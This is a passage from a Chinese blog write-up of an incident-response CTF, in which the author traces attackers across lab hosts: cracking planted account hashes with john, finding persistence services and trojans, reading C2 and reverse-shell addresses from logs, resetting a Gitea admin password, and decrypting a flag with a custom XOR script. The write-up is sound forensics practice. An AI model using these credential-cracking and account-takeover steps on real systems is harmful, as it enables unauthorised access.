title="6.提交web服务泄露的关键文件名"></a>6.提交web服务泄露的关键文件名</h2><p>在waf的静态网站文件中有一个key.txt<br>palu{key.txt}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518134358.png"></p><h2 id="7-题解泄露的邮箱地址"><a href="#7-题解泄露的邮箱地址" class="headerlink" title="7.题解泄露的邮箱地址"></a>7.题解泄露的邮箱地址</h2><p>在key.txt中最后面有邮箱<br>palu{<a href="mailto:&#x70;&#97;&#x72;&#x6c;&#111;&#111;&#x40;&#112;&#97;&#114;&#108;&#x6f;&#111;&#x2e;&#99;&#111;&#109;">parloo@parloo.com</a>}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518134504.png"></p><h2 id="8-提交立足点服务器ip地址"><a href="#8-提交立足点服务器ip地址" class="headerlink" title="8.提交立足点服务器ip地址"></a>8.提交立足点服务器ip地址</h2><p>palu{192.168.20.108}<br>服务端的爆破流量<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517201246.png"><br>堡垒机中的ssh爆破流量也来自108<code>lastb</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517204751.png"></p><h2 id="9-提交攻击者使用的提权的用户和密码"><a href="#9-提交攻击者使用的提权的用户和密码" class="headerlink" title="9.提交攻击者使用的提权的用户和密码"></a>9.提交攻击者使用的提权的用户和密码</h2><p>在sshserver中的passwd中发现parloo用户，通过john直接爆破出flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518183742.png"><br>palu{parloo&#x2F;parlook}</p><h2 id="10-提交攻击者留下的的文件内容作为flag提交"><a href="#10-提交攻击者留下的的文件内容作为flag提交" class="headerlink" title="10.提交攻击者留下的的文件内容作为flag提交"></a>10.提交攻击者留下的的文件内容作为flag提交</h2><p>在sshserver中，在parloo用户的家目录中发现flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517202040.png"></p><h2 id="11-提交权限维持方法的名称"><a href="#11-提交权限维持方法的名称" class="headerlink" title="11.提交权限维持方法的名称"></a>11.提交权限维持方法的名称</h2><p>没做出来，具体原因是没有思路。。。题目太多了就做别的题目了。。在sshserver中通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --<span class="built_in">type</span>=service --state=running</span><br></pre></td></tr></table></figure><p>列出了所有已经在运行的服务，发现有两个奇怪的服务<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520170031.png"><br>仔细看一下这个服务发现问题<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520170128.png"><br>运行的b4b40c44ws，这个在受感染的机器中可以找到，放入沙箱之后可以发现这是一个木马。<br>palu{rootset}</p><h2 id="12-提交攻击者攻击恶意服务器连接地址作为flag提交"><a href="#12-提交攻击者攻击恶意服务器连接地址作为flag提交" class="headerlink" title="12.提交攻击者攻击恶意服务器连接地址作为flag提交"></a>12.提交攻击者攻击恶意服务器连接地址作为flag提交</h2><p>在Server01中发现后门用户的家目录中发现aa程序<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517210611.png"><br>ida分析<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517210619.png"><br>palu{47.101.213.153}</p><h2 id="13-找到系统中被劫持的程序程序名作为flag提交"><a href="#13-找到系统中被劫持的程序程序名作为flag提交" class="headerlink" title="13.找到系统中被劫持的程序程序名作为flag提交"></a>13.找到系统中被劫持的程序程序名作为flag提交</h2><p>没解出来，在sshserver中，通过下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -ytpe f -newermt <span class="string">&quot;2025-05-6&quot;</span> ! -newermt <span class="string">&quot;2025-05-010&quot;</span></span><br></pre></td></tr></table></figure><p>搜索近期5月份被修改的文件可以找到<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520170919.png"><br>题目说是被劫持的，所以是<br>palu{id}</p><h2 id="14-找到系统中存在信息泄露的服务运行端口作为flag提交"><a href="#14-找到系统中存在信息泄露的服务运行端口作为flag提交" class="headerlink" title="14.找到系统中存在信息泄露的服务运行端口作为flag提交"></a>14.找到系统中存在信息泄露的服务运行端口作为flag提交</h2><p>在面板中或者服务器使用<code>ss -tnl</code>都可以发现额外的端口，直接访问<br>palu{8081}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518141326.png"></p><h2 id="15-提交Parloo公司项目经理的身份证号作为flag提交"><a href="#15-提交Parloo公司项目经理的身份证号作为flag提交" class="headerlink" title="15.提交Parloo公司项目经理的身份证号作为flag提交"></a>15.提交Parloo公司项目经理的身份证号作为flag提交</h2><p>在server01主机的8081端口中可以直接发现，可以直接编辑<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250517210902.png"><br>palu{310105198512123456}</p><h2 id="16-提交存在危险功能的操作系统路径作为flag提交"><a href="#16-提交存在危险功能的操作系统路径作为flag提交" class="headerlink" title="16.提交存在危险功能的操作系统路径作为flag提交"></a>16.提交存在危险功能的操作系统路径作为flag提交</h2><p>没做出来…在waf中发现有一个应用路由如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520192707.png"></p><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520192742.png"><br>发现可以执行命令<br>palu{&#x2F;admin&#x2F;parloo}</p><h2 id="17-提交进源机器中恶意程序的MD5作为flag进行提交。"><a href="#17-提交进源机器中恶意程序的MD5作为flag进行提交。" class="headerlink" title="17.提交进源机器中恶意程序的MD5作为flag进行提交。"></a>17.提交进源机器中恶意程序的MD5作为flag进行提交。</h2><p>没做出来，火绒剑中可以看到启动项中存在一个奇怪的内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520193754.png"><br>文件拖入到沙箱中发现是恶意程序<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520193931.png"><br>palu{8cc6fc843882735e1c1152b383e35e3b}</p><h2 id="18-提交攻击者留下的恶意账户名称md5后作为flag进行提交"><a href="#18-提交攻击者留下的恶意账户名称md5后作为flag进行提交" class="headerlink" title="18.提交攻击者留下的恶意账户名称md5后作为flag进行提交"></a>18.提交攻击者留下的恶意账户名称md5后作为flag进行提交</h2><p>在登录的时候就有hack 在用户目录下也发现了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518142202.png"><br>palu{d78b6f30225cdc811adfe8d4e7c9fd34}</p><h2 id="19-提交内部群中留下的flag并提交"><a href="#19-提交内部群中留下的flag并提交" class="headerlink" title="19.提交内部群中留下的flag并提交"></a>19.提交内部群中留下的flag并提交</h2><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518141814.png"><br>palu{nbq_nbq_parloo}</p><h2 id="20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"><a href="#20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交" class="headerlink" title="20.请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"></a>20.请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</h2><p>没出 在17题中，发现了软件的被代理端是server服务器上的，通过查看端口(waf中其实写好了是8080)-&gt;通过端口查pid-》id拿到文件位置-》拿到位置发现有日志<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520194240.png"><br>查看日志发现是空的，又通过用户记录发现了一个相同文件名字，查看拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520194552.png"><br>日志很乱直接过滤flag就可以出了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520194635.png"><br>palu{Server_Parloo_2025}</p><h2 id="21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"><a href="#21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交" class="headerlink" title="21.提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"></a>21.提交获取敏感内容IP的第一次执行命令时间作为flag进行提交</h2><p>没出<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520194746.png"><br>对应20，日志第一条就是flag<br>palu{192.168.20.1}</p><h2 id="22-提交攻击者使用的恶意ip和端口"><a href="#22-提交攻击者使用的恶意ip和端口" class="headerlink" title="22.提交攻击者使用的恶意ip和端口"></a>22.提交攻击者使用的恶意ip和端口</h2><p>没做出，通过下面命令拿到反弹shell地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/parloo/command.log |grep -e <span class="string">&quot;^\[&quot;</span> |awk -F <span class="string">&quot;|&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520195037.png"><br>palu{10.12.12.13:9999}</p><h2 id="23-提交重要数据的内容作为flag提交"><a href="#23-提交重要数据的内容作为flag提交" class="headerlink" title="23.提交重要数据的内容作为flag提交"></a>23.提交重要数据的内容作为flag提交</h2><p>没做出，在PC3机器发现重要数据，直接提交没用<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520195235.png"><br>具体的解密脚本在gitea的hack仓库中具体的进入私人仓库的方法可以在39问中找到，当时想到了可能是这个加密的，但是做其他的题目给忘了。。。具体的加密逻辑如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520201158.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        shifted = <span class="built_in">ord</span>(char) + (i % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((xored &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        encrypted.append(<span class="string">f&quot;<span class="subst">&#123;substituted:02x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(encrypted)</span><br></pre></td></tr></table></figure><p>这里只是加密脚本需要自己推回来解密脚本，我这里直接通过ai出<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520201930.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">encrypted_text, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Process the encrypted text two characters at a time (hex pairs)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_text), <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># Convert hex pair to integer</span></span><br><span class="line">        substituted = <span class="built_in">int</span>(encrypted_text[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Reverse nibble swap</span></span><br><span class="line">        xored = ((substituted &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((substituted &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Reverse XOR with key</span></span><br><span class="line">        xor_key = key_bytes[i // <span class="number">2</span> % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Reverse the position-based shift</span></span><br><span class="line">        char_code = shifted - ((i // <span class="number">2</span> % <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Convert back to character</span></span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(char_code))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted)</span><br></pre></td></tr></table></figure><p>现在还缺少一个密钥，因为flag的格式是<code>palu&#123;</code>他这里的几秒也是按位进行的，直接把条件给ai让他去推<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520202234.png"><br>前缀是MySec，最后面是一个k，我就不多加ai的截图了线索就是<br><code>MySec*k</code><br>这大概率是单词，后面可以菜是key中间大概率是秘密慢慢试就出了<br><code>MySecretKey</code><br>完整脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">        shifted = <span class="built_in">ord</span>(char) + (i % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((xored &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        encrypted.append(<span class="string">f&quot;<span class="subst">&#123;substituted:02x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">encrypted_text, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process the encrypted text two characters at a time (hex pairs)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_text), <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># Convert hex pair to integer</span></span><br><span class="line">        substituted = <span class="built_in">int</span>(encrypted_text[i : i + <span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse nibble swap</span></span><br><span class="line">        xored = ((substituted &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((substituted &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse XOR with key</span></span><br><span class="line">        xor_key = key_bytes[i // <span class="number">2</span> % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse the position-based shift</span></span><br><span class="line">        char_code = shifted - ((i // <span class="number">2</span> % <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert back to character</span></span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(char_code))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(custom_decrypt(<span class="string">&quot;c3a1c3c13e326020c3919093e1260525045e&quot;</span>, <span class="string">&quot;MySecretKey&quot;</span>))</span><br></pre></td></tr></table></figure><p>palu{Password-000}</p><h2 id="24-提交恶意维权软件的名称作为flag进行提交"><a href="#24-提交恶意维权软件的名称作为flag进行提交" class="headerlink" title="24.提交恶意维权软件的名称作为flag进行提交"></a>24.提交恶意维权软件的名称作为flag进行提交</h2><p>没做出，同17问<br>palu{svhost}</p><h2 id="25-提交恶意程序的外联地址"><a href="#25-提交恶意程序的外联地址" class="headerlink" title="25.提交恶意程序的外联地址"></a>25.提交恶意程序的外联地址</h2><p>在palu3中家目录里有一个ipconfig<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518144727.png"><br>反编译后拿到原代码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518144742.png"><br>敏感信息<br>palu{88.173.90.103}</p><h2 id="26-提交攻击这使用的恶意dnslog域名作为flag进行提交"><a href="#26-提交攻击这使用的恶意dnslog域名作为flag进行提交" class="headerlink" title="26.提交攻击这使用的恶意dnslog域名作为flag进行提交"></a>26.提交攻击这使用的恶意dnslog域名作为flag进行提交</h2><p>没做出，在22问的命令中，可以发现下面命令<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520202914.png"><br>肯定是他们其中一个，palu{np85qqde.requestrepo.com}</p><h2 id="27-提交寻找反序列化漏洞的端口作为flag进行提交"><a href="#27-提交寻找反序列化漏洞的端口作为flag进行提交" class="headerlink" title="27.提交寻找反序列化漏洞的端口作为flag进行提交"></a>27.提交寻找反序列化漏洞的端口作为flag进行提交</h2><p>没做出，可以在waf的反序列化攻击类型中找到相应的日志，然后日志不多就两页，挨个排查，出现404的基本不能存在反序列化漏洞了，嫌疑最大的就是9999<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520203446.png"></p><p>palu{9999}</p><h2 id="28-提交web服务泄露的密钥作为flag进行提交"><a href="#28-提交web服务泄露的密钥作为flag进行提交" class="headerlink" title="28.提交web服务泄露的密钥作为flag进行提交"></a>28.提交web服务泄露的密钥作为flag进行提交</h2><p>在server里有一个adminaf.jar,jadx反编译后拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520203947.png"><br><code>palu&#123;QZYysgMYhG6/CzIJlVpR2g==&#125;</code></p><h2 id="29-提交攻击者开始攻击的时间作为flag进行提交"><a href="#29-提交攻击者开始攻击的时间作为flag进行提交" class="headerlink" title="29.提交攻击者开始攻击的时间作为flag进行提交"></a>29.提交攻击者开始攻击的时间作为flag进行提交</h2><p>这个没出，到现在也没出，看其他师傅的wp也都没出。。。</p><h2 id="30-提交攻击者在server中留下的账户密码作为flag进行提交"><a href="#30-提交攻击者在server中留下的账户密码作为flag进行提交" class="headerlink" title="30.提交攻击者在server中留下的账户密码作为flag进行提交"></a>30.提交攻击者在server中留下的账户密码作为flag进行提交</h2><p>在server主机的passwd中发现<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518120530.png"><br>通过 john拿到密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518120610.png"><br>palu{parloohack&#x2F;123456}</p><h2 id="31-提交攻击者维权方法的名称作为flag进行提交"><a href="#31-提交攻击者维权方法的名称作为flag进行提交" class="headerlink" title="31.提交攻击者维权方法的名称作为flag进行提交"></a>31.提交攻击者维权方法的名称作为flag进行提交</h2><p>在server主机中parloohack用户的bash_history中发现下面内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518121448.png"><br>采用服务的方式<br>palu{parloohack_script.service}</p><h2 id="32-提交攻击者留下的木马md5后作为flag进行提交"><a href="#32-提交攻击者留下的木马md5后作为flag进行提交" class="headerlink" title="32.提交攻击者留下的木马md5后作为flag进行提交"></a>32.提交攻击者留下的木马md5后作为flag进行提交</h2><p>在server主机中parloohack用户家目录中发现奇怪文件<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518121038.png"><br>通过沙箱发现是木马<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518121051.png"><br>palu{4123940b3911556d4bf79196cc008bf4}</p><h2 id="33-提交攻击者留下的溯源信息作为flag进行提交"><a href="#33-提交攻击者留下的溯源信息作为flag进行提交" class="headerlink" title="33.提交攻击者留下的溯源信息作为flag进行提交"></a>33.提交攻击者留下的溯源信息作为flag进行提交</h2><p>palu{X5E1yklz1oAdyHBZ}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518170804.png"></p><h2 id="34-提交攻击者的githubID作为flag进行提交"><a href="#34-提交攻击者的githubID作为flag进行提交" class="headerlink" title="34.提交攻击者的githubID作为flag进行提交"></a>34.提交攻击者的githubID作为flag进行提交</h2><p>没出，在33题中的用户名是一个qq号，查看qq空间内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520205827.png"><br>palu{ParlooSEc}</p><h2 id="35-提交攻击者在github下留下的的内容作为flag进行提交"><a href="#35-提交攻击者在github下留下的的内容作为flag进行提交" class="headerlink" title="35.提交攻击者在github下留下的的内容作为flag进行提交"></a>35.提交攻击者在github下留下的的内容作为flag进行提交</h2><p>没出，在34题中拿到id进入他的仓库拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520205917.png"><br>palu{s5o3WkX33hptyJjk}</p><h2 id="36-提交恶意用户的数量作为flag进行提交"><a href="#36-提交恶意用户的数量作为flag进行提交" class="headerlink" title="36.提交恶意用户的数量作为flag进行提交"></a>36.提交恶意用户的数量作为flag进行提交</h2><p>palu{99}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518150446.png"></p><h2 id="37-提交恶意用户的默认密码作为flag进行提交"><a href="#37-提交恶意用户的默认密码作为flag进行提交" class="headerlink" title="37.提交恶意用户的默认密码作为flag进行提交"></a>37.提交恶意用户的默认密码作为flag进行提交</h2><p>似乎不对，因为我是在java后门中找到的在server1主机中发现了一adminAF.jar反编译发现默认用户名是admin密码是123456<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518132526.png"><br>palu{123456}<br>这道题目是意外出的，按理说这个程序似乎是人家公司自己的，不是恶意用户。。。意外的。。。</p><h2 id="38-提交业务数据中攻击者留下的信息作为flag进行提交"><a href="#38-提交业务数据中攻击者留下的信息作为flag进行提交" class="headerlink" title="38.提交业务数据中攻击者留下的信息作为flag进行提交"></a>38.提交业务数据中攻击者留下的信息作为flag进行提交</h2><p>mysql主机的gitea的用户表中<br>palu{crP1ZIVfqrkfdhGy}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518125411.png"></p><h2 id="39-提交私人git仓库中留下的内容作为flag进行提交"><a href="#39-提交私人git仓库中留下的内容作为flag进行提交" class="headerlink" title="39.提交私人git仓库中留下的内容作为flag进行提交"></a>39.提交私人git仓库中留下的内容作为flag进行提交</h2><p>重置admin密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">224d7f8df25c:/$ gitea admin user change-password --username <span class="string">&quot;admin&quot;</span> --password <span class="string">&quot;Qwer1234&quot;</span></span><br></pre></td></tr></table></figure><p>登录发现flag(base64解码)<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518130723.png"><br>palu{FO65SruuTukdpBS5}</p><h2 id="40-提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"><a href="#40-提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交" class="headerlink" title="40.提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交"></a>40.提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</h2><p>没出，这个没仔细看…炒<br>在mysql的root目录下，存在下面内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520210535.png"><br>.a很可疑，ida反编译出下面内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520210810.png"><br>数据输出就是创建隐藏文件。。<br>palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1}</p><h2 id="41-提交恶意程序中模拟c2通信的函数名称作为flag进行提交"><a href="#41-提交恶意程序中模拟c2通信的函数名称作为flag进行提交" class="headerlink" title="41.提交恶意程序中模拟c2通信的函数名称作为flag进行提交"></a>41.提交恶意程序中模拟c2通信的函数名称作为flag进行提交</h2><p>没出，同40题目程序<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520210936.png"><br>palu{simulate_network_communication}</p><h2 id="42-提交恶意程序创建隐藏文件的名称作为flag提交"><a href="#42-提交恶意程序创建隐藏文件的名称作为flag提交" class="headerlink" title="42.提交恶意程序创建隐藏文件的名称作为flag提交"></a>42.提交恶意程序创建隐藏文件的名称作为flag提交</h2><p>没出，同40题目程序<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520211028.png"><br>palu{.malware_log.txt}</p><h2 id="43-提交恶意程序中模拟权限提升的函数作为flag进行提交"><a href="#43-提交恶意程序中模拟权限提升的函数作为flag进行提交" class="headerlink" title="43.提交恶意程序中模拟权限提升的函数作为flag进行提交"></a>43.提交恶意程序中模拟权限提升的函数作为flag进行提交</h2><p>没出，同40题目程序<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520211237.png"><br>palu{simulate_privilege_escalation}</p><h2 id="44-提交被钓鱼上线的用户名作为flag进行提交"><a href="#44-提交被钓鱼上线的用户名作为flag进行提交" class="headerlink" title="44.提交被钓鱼上线的用户名作为flag进行提交"></a>44.提交被钓鱼上线的用户名作为flag进行提交</h2><p>只有在子怡的PC(PC2)中发现了浏览器的记录并且存在访问记录<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518150923.png"><br>palu{Parloo-子怡}</p><h2 id="45-提交恶意程序的所在路径作为flag进行提交"><a href="#45-提交恶意程序的所在路径作为flag进行提交" class="headerlink" title="45.提交恶意程序的所在路径作为flag进行提交"></a>45.提交恶意程序的所在路径作为flag进行提交</h2><p>没出，在PC2的聊天记录中发现<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520211715.png"><br>程序拖入沙箱是个木马<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520212154.png"><br>palu{C:\Users\Public\Nwt\cache\recv\Parloo-沉沉}</p><h2 id="46-分析恶意程序的反连地址作为flag进行提交"><a href="#46-分析恶意程序的反连地址作为flag进行提交" class="headerlink" title="46.分析恶意程序的反连地址作为flag进行提交"></a>46.分析恶意程序的反连地址作为flag进行提交</h2><p>没出，很奇怪这道题我怎么没出。。都找到了。。。依旧是在浏览器的账号管理中，44题的截图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250520212226.png"><br>palu{47.101.213.153}</p><h2 id="47-提交恶意c2的服务器登录的账号密码作为flag进行提交。"><a href="#47-提交恶意c2的服务器登录的账号密码作为flag进行提交。" class="headerlink" title="47.提交恶意c2的服务器登录的账号密码作为flag进行提交。"></a>47.提交恶意c2的服务器登录的账号密码作为flag进行提交。</h2><p>palu2 谷歌浏览器中直接获取<br>palu{admin&#x2F;admin@qwer}<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250518145621.png"></p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>除了应急响应方向的<code>应急1的攻击者开放3个端口</code>和<code>应急2的29</code>基本在赛后都出了，应急响应的比赛打得太少了，赛后复现感觉好多题目都能出，还得好好练练…<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519092214.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250519092301.png"><br><img src="https://image.boychai.xyz/article/palu_2025_certificate.png"></p>]]></content>
    
    
    <summary type="html">畸形的爱
攻击者ip地址1
nginx日志 31网段之外的基本都是内网ip，所以不考虑
palu{192.168.31.240}


攻击者ip地址2
这道题目没做出来，主要原因是光做主线了，这个简单过了一下，没有在意到docker容器，在webserver中有一个webdata容器，开启会报错，原因是在题目创建时绑定了一个当时主机的ip，复现的虚拟机因为环境问题无法从挂起状态恢复导致虚拟机的ip被本地的dhcp更换了，所以开启不了，具体报错如下

1
2
3


root@ubuntu:/var/www/html# docker start WebData
Error response fr</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WriteUp" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
